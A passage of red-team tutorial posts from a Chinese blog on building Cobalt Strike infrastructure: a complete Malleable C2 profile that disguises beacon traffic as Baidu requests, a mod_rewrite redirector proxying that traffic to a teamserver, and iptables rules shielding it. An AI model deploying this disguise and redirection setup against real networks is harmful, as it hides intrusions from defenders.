&quot;same-origin&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Mode&quot; &quot;navigate&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Dest&quot; &quot;document&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;https:&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;bd_logo1.png&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;zh-CN,zh;q&#x3D;0.9&quot;;</span><br><span class="line">        header &quot;Cookie&quot; &quot;BIDUPSID&#x3D;29E3A0F2775C00D759FDA49E071A0B78; PSTM&#x3D;1592203863; BAIDUID&#x3D;7B3B91054F6B7C69CCE98B945C800795:FG&#x3D;1; BD_UPN&#x3D;12314753; BDSFRCVID&#x3D;yi0OJeC62GgmFcJr_-UrEMX0j6W8_fcTH6aoA6yEDjKjrwuywjufEG0P_M8g0KubVI2-ogKKy2OTH9DF_2uxOjjg8UtVJeC6EG0Ptf8g0M5; H_BDCLCKID_SF&#x3D;tRk8_KtKtCI3HnRY-P4_-tAt2qoXetJyaR38BCJvWJ5TMCojbPcP-UIXBgcPbfQuynRB_f0yXbQjShPC-tnNjRFkQM6iaJjfb65fBt5D3l02VM7Ee-t2ynLV34uHe4RMW238oq7mWITUsxA45J7cM4IseboJLfT-0bc4KKJxbnLWeIJEjj6jK4JKDNtDJ5vP; BDRCVFR[feWj1Vr5u3D]&#x3D;I67x6TjHwwYf0; delPer&#x3D;0; BD_CK_SAM&#x3D;1; COOKIE_SESSION&#x3D;18454_1_8_9_7_18_0_0_8_6_2_3_3514086_0_11_0_1599115184_1598838986_1599115173%7C9%230_1_1598838982%7C1; BD_HOME&#x3D;1; PSINO&#x3D;7; BDORZ&#x3D;B490B5EBF6F3CD402E515D22BCDA1598; BDRCVFR[dG2JNJb_ajR]&#x3D;mk3SLVN4HKm; H_PS_PSSID&#x3D;7541_32606_1421_32620_32327_31660_32115_7565_32691_26350; H_PS_645EC&#x3D;7f76DbrvJ3OSPPa0yE9HFSBygVDDoW5VRlO3pSIe%2BNw%2FIsO0qfi9%2B7kDdR5DButmXkOX; BDSVRTM&#x3D;0&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">    header &quot;Accept-Ranges&quot; &quot;bytes&quot;;</span><br><span class="line">	header &quot;Content-Type&quot; &quot;image&#x2F;x-icon&quot;;	</span><br><span class="line">	header &quot;Etag&quot; &quot;423e-55c8139094a40&quot;;</span><br><span class="line">	header &quot;Last-Modified:&quot; &quot;Fri, 27 Oct 2017 06:16:01 GMT&quot;;</span><br><span class="line">    header &quot;Server&quot; &quot;Apache&quot;;</span><br><span class="line">    header &quot;Vary&quot; &quot;Accept-Encoding,User-Agent&quot;;</span><br><span class="line">    header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">        output &#123;</span><br><span class="line">            prepend &quot;                 @@                  (B         (         @                 @&quot;</span><br><span class="line">            print;</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        配置好这些信息后我们最后再配置一下stage的混淆</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">stage &#123;</span><br><span class="line">	set userwx &quot;false&quot;;</span><br><span class="line">	set obfuscate &quot;false&quot;;</span><br><span class="line">	set image_size_x86 &quot;305000&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        好了，差不多就配置完成了，我们将这个整体用cl2int去测试一下</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908161204018.png" alt="image-20200908161204018"></p>
<p>​        这里有些警告说是header长度过长，这个可以先不用管</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908162211661.png" alt="image-20200908162211661"></p>
<p>​        加载Mallable C2 profile文件开启teamserver后，生成一个shell执行后，执行可以正常上线</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908163451703.png" alt="image-20200908163451703"></p>
<p>​        再用wireshark抓下流量看看，下载stage的流量如下</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908163619714.png" alt="image-20200908163619714"></p>
<p>​        心跳包的数据包如下</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908163659565.png" alt="image-20200908163659565"></p>
<p>​        获取回显的数据包如下</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908163806457.png" alt="image-20200908163806457"></p>
<p>​        好了，配置mallable C2 profile到此为止了，附上最终的profile文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">###Global Options###</span><br><span class="line">set sample_name &quot;baidu.profile&quot;;</span><br><span class="line"></span><br><span class="line">set sleeptime &quot;5000&quot;;  </span><br><span class="line">set jitter    &quot;30&quot;;   </span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.83 Safari&#x2F;537.36&quot;; </span><br><span class="line"></span><br><span class="line">###SMB options###    </span><br><span class="line">set pipename &quot;ntsvcs&quot;;</span><br><span class="line">set pipename_stager &quot;ntsvc&quot;;</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;cache&#x2F;global&#x2F;img&#x2F;aladdinIcon-1.0.gif&quot;;</span><br><span class="line">	client &#123;</span><br><span class="line">        header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Dest&quot; &quot;image&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;https:&#x2F;&#x2F;www.baidu.com&#x2F;&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;zh-CN,zh;q&#x3D;0.9&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;Keep-Alive&quot;;</span><br><span class="line">	</span><br><span class="line">        metadata &#123;</span><br><span class="line">            netbios;</span><br><span class="line">	    parameter &quot;sid&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    server &#123;</span><br><span class="line">		header &quot;Accept-Ranges&quot; &quot;bytes&quot;;</span><br><span class="line">		header &quot;Cache-Control&quot; &quot;max-age&#x3D;315360000&quot;;	</span><br><span class="line">		header &quot;Content-Type&quot; &quot;image&#x2F;gif&quot;;</span><br><span class="line">		header &quot;Date&quot; &quot;Tue, 08 Sep 2020 06:29:52 GMT&quot;;</span><br><span class="line">		header &quot;Etag&quot; &quot;216-4c1c6ca3503c0&quot;;</span><br><span class="line">		header &quot;Expires&quot; &quot;216-4c1c6ca3503c0&quot;;</span><br><span class="line">		header &quot;Last-Modified&quot; &quot;Wed, 06 Jun 2012 05:10:47 GMT&quot;;</span><br><span class="line">		header &quot;Server&quot; &quot;Apache&quot;;</span><br><span class="line">		header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">        	netbios;</span><br><span class="line">        	prepend &quot;                 &quot;;</span><br><span class="line">	   		prepend &quot;GIF89a&quot;;</span><br><span class="line">	    	append &quot;;&quot;;</span><br><span class="line">        	print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">http-post &#123;</span><br><span class="line">    set uri &quot;&#x2F;link&quot;;</span><br><span class="line">    set verb &quot;GET&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">	header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Mode&quot; &quot;navigate&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Dest&quot; &quot;document&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;zh-CN,zh;q&#x3D;0.9&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64url;</span><br><span class="line">	    	parameter &quot;url&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        id &#123;</span><br><span class="line">            base64url;</span><br><span class="line">            parameter &quot;eqid&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">		parameter &quot;wd&quot; &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">	header &quot;Bdpagetype&quot; &quot;3&quot;;</span><br><span class="line">	header &quot;Content-Type&quot; &quot;text&#x2F;html&quot;;	</span><br><span class="line">	header &quot;Server&quot; &quot;BWS&#x2F;1.1&quot;;</span><br><span class="line">	header &quot;Set-Cookie&quot; &quot;BDSVRTM&#x3D;0; path&#x3D;&#x2F;&quot;;</span><br><span class="line">	header &quot;Vary&quot; &quot;Accept-Encoding&quot;;</span><br><span class="line">    header &quot;X-Ua-Compatible&quot; &quot;IE&#x3D;Edge,chrome&#x3D;1&quot;;    </span><br><span class="line">	header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            netbios;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-stager &#123;</span><br><span class="line"></span><br><span class="line">	set uri_x86 &quot;&#x2F;favicon.ico&quot;;</span><br><span class="line">	set uri_x64 &quot;&#x2F;Favicon.ico&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">	header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;https:&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;bd_logo1.png&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;zh-CN,zh;q&#x3D;0.9&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	server &#123;</span><br><span class="line">	header &quot;Accept-Ranges&quot; &quot;bytes&quot;;</span><br><span class="line">	header &quot;Content-Type&quot; &quot;image&#x2F;x-icon&quot;;	</span><br><span class="line">	header &quot;Etag&quot; &quot;423e-55c8139094a40&quot;;</span><br><span class="line">	header &quot;Last-Modified:&quot; &quot;Fri, 27 Oct 2017 06:16:01 GMT&quot;;</span><br><span class="line">    	header &quot;Server&quot; &quot;Apache&quot;;</span><br><span class="line">    	header &quot;Vary&quot; &quot;Accept-Encoding,User-Agent&quot;;</span><br><span class="line">    	header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            prepend &quot;                 @@                  (B         (         @                 @&quot;;</span><br><span class="line">            print;</span><br><span class="line">        	&#125; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stage &#123;</span><br><span class="line">	set userwx &quot;false&quot;;</span><br><span class="line">	set obfuscate &quot;false&quot;;</span><br><span class="line">	set image_size_x86 &quot;305000&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="mod-rewrite对不同流量转发"><a href="#mod-rewrite对不同流量转发" class="headerlink" title="mod_rewrite对不同流量转发"></a>mod_rewrite对不同流量转发</h3><p>​        通过上面的设置，我们已经对我们的流量进行重新设置，那么现在可以根据流量来通过.htaccess来设置流量的转发操作，.htaccess文件内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond %&#123;REQUEST_URI&#125; ^&#x2F;(cache&#x2F;global&#x2F;img&#x2F;aladdinIcon-1.0.gif|link|favicon.ico|Favicon.ico)&#x2F;?$</span><br><span class="line">RewriteRule ^.*$ http:&#x2F;&#x2F;teamserver-ip:8880%&#123;REQUEST_URI&#125; [P]</span><br><span class="line">RewriteRule ^.*$ https:&#x2F;&#x2F;www.baidu.com&#x2F;? [L,R&#x3D;302]</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure>

<p>​        配置好以后我们大致进行一下测试。</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908171959301.png" alt="image-20200908171959301"></p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908172017233.png" alt="image-20200908172017233"></p>
<p>​        应该是没有什么问题，我们回到cobaltstrike，设置一个listener，host设置为前置机对应的<strong>ip</strong>，这里还需要注意前置机的web端口应该和这里的端口一致，否则是不会上线的。</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908174336222.png" alt="image-20200908174336222"></p>
<p>​        成功上线</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908174454181.png" alt="image-20200908174454181"></p>
<p>​        但我们想通过域名来进行上线，但是是无法上线的，因为profile里的域名是百度的域名，我将域名改成自己的域名再进行测试。发现是可以上线的。</p>
<p>​        因此，<strong>如果我们想用域名上线，并且给域名加上CDN，我们申请的域名必须和我们伪造的域名类似。</strong></p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908175239355.png" alt="image-20200908175239355"></p>
<h3 id="设置防火墙"><a href="#设置防火墙" class="headerlink" title="设置防火墙"></a>设置防火墙</h3><p>​        还有最后一个问题解决，我们想要保护自己的teamserver，给我们的监听端口设置规则，只能让我们的重定向服务器访问，其他的都无法访问，该怎么做。</p>
<p>​        使用iptables进行设置，仅允许特定的ip访问我们teamserver的8880端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT  -p tcp --dport 8880 -j DROP</span><br><span class="line">iptables -A INPUT -s xxx.xxx.xxx.xx -p tcp --dport 8880 -j ACCEPT</span><br><span class="line">iptables -L -n --line-number  </span><br><span class="line">iptables-save</span><br></pre></td></tr></table></figure>

<p>​        设置好以后再使用其他的主机去访问我们teamserver的8880端口已经无法访问了。</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908193828070.png" alt="image-20200908193828070"></p>
<p>​        但是我们的beacon还可以正常运行</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908194108753.png" alt="image-20200908194108753"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">关于Mod_Rewrite重定向cobaltstrike流量的学习总结</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-09-04 17:20:35" itemprop="dateCreated datePublished" datetime="2020-09-04T17:20:35+08:00">2020-09-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-09-08 11:11:54" itemprop="dateModified" datetime="2020-09-08T11:11:54+08:00">2020-09-08</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/cobaltstrike/" itemprop="url" rel="index">
                    <span itemprop="name">cobaltstrike</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        通过使用socat进行重定向虽然可以将我们的teamserver隐藏起来，但是我们如果想做的更好一些，对请求我们重定向主机的流量做一个区分，如果请求来自客户端则重定向到teamserver，如果请求来自其他请求则重定向到其他网站。或者在请求中设置白名单，仅仅允许来自某个特定的ip来访问。这就需要通过apache 的Mod_rewrite来实现。</p>
<h3 id="mod-rewrite入门"><a href="#mod-rewrite入门" class="headerlink" title="mod_rewrite入门"></a>mod_rewrite入门</h3><p><strong>什么是mod_rewrite？</strong></p>
<p>​        mod_rewrite是Apache的一个模块，此模块提供了一个基于正则表达式分析器的重写引擎来实时重写URL请求。它支持每个完整规则可以拥有不限数量的子规则以及附加条件规则的灵活而且强大的URL操作机制。此URL操作可以依赖于各种测试，比如服务器变量、环境变量、HTTP头、时间标记，甚至各种格式的用于匹配URL组成部分的查找数据库。 –<a href="https://my.oschina.net/u/2326780/blog/385304" target="_blank" rel="noopener">mod_rewrite模块作用介绍</a></p>
<p>​         此模块可以操作URL的所有部分(包括路径信息部分)，在服务器级的(httpd.conf)和目录级的(.htaccess)配置都有效，还可以生成最终请求字符串。此重写操作的结果可以是内部子处理，也可以是外部请求的转向，甚至还可以是内部代理处理。<strong>一般mod_rewrite默认是不启动的，这时我们需要手动启用它</strong>  –<a href="https://my.oschina.net/u/2326780/blog/385304" target="_blank" rel="noopener">mod_rewrite模块作用介绍</a></p>
<p><strong>怎么使用mod_rewrite？</strong></p>
<p>​        首先安装apache</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install httpd</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200904183349947.png" alt="image-20200904183349947"></p>
<p>​        安装好以后，查看是否开启mod_rewrite模块,在下面的路径下，我们可以看到我这里默认已经开启了这个模块。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf.modules.d&#x2F;00-base.conf</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907092649577.png" alt="image-20200907092649577"></p>
<p>​        也可以使用下面的命令检查是否开启,如果能在输出中找到rewrite_module，则说明开启成功</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpd -M</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907095113772.png" alt="image-20200907095113772"></p>
<p>​        然后我们需要开启.htaccess的支持，找到/etc/httpd/conf/httpd.conf文件，找到下面的内容，将AllowOverride None 替换为AllowOverride All,注意，这里的<strong>Directory是/var/www/html</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &quot; &#x2F;var&#x2F;www&#x2F;html&quot;&gt;</span><br><span class="line">....</span><br><span class="line">    AllowOverride None  &#x2F;&#x2F;替换为AllowOverride All</span><br><span class="line">    Require all granted</span><br><span class="line">&lt;&#x2F;Directory&gt;</span><br></pre></td></tr></table></figure>

<p>​        设置好以后启动apache服务,再访问一下看是否开启成功</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service httpd start</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907092757010.png" alt="image-20200907092757010"></p>
<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907092849077.png" alt="image-20200907092849077"></p>
<p>​    开启后我们在/var/www/html/下编写一个2.html文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">2.html</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>​        再编写一个.htaccess文件，文件内容如下，我大概先解释一下里面的语法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine on   </span><br><span class="line">RewriteRule 1.html 2.html</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure>

<p>​        RewriteEngine on,RewriteEngine 是rewrite功能的总开关，用来开启是否启动url rewrite。</p>
<p>​        RewriteRule 是指令允许我们基于URL将请求重新映射到Apache。一个<code>.htaccess</code>文件可以容纳多个重写规则，但在运行时，Apache按照定义的顺序应用规则。RewriteRule的语法规则如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RewriteRule Pattern Substitution [Flags]</span><br></pre></td></tr></table></figure>

<p>​        Pattern需要匹配的字符串，Substitution替换为其他的url</p>
<p>​        编写好以后我们测试一下，访问1.html，实际上这个文件是不存在的，但是经过.htaccess的RewriteRule规则，我们访问到了2.html的内容</p>
<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907102919483.png" alt="image-20200907102919483"></p>
<p>​        最后，我们再介绍一个关于mod_rewrite的语法:RewriteCond。</p>
<p>​        <code>RewriteCond</code>指令允许我们为重写规则添加条件。重写条件包括以下结构：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RewriteRule TestString  Condition  [Flags]</span><br></pre></td></tr></table></figure>

<p>​        TestString:要测试的字符串，Condition：匹配的模式,flag如果是NC则代表忽略大小写的匹配</p>
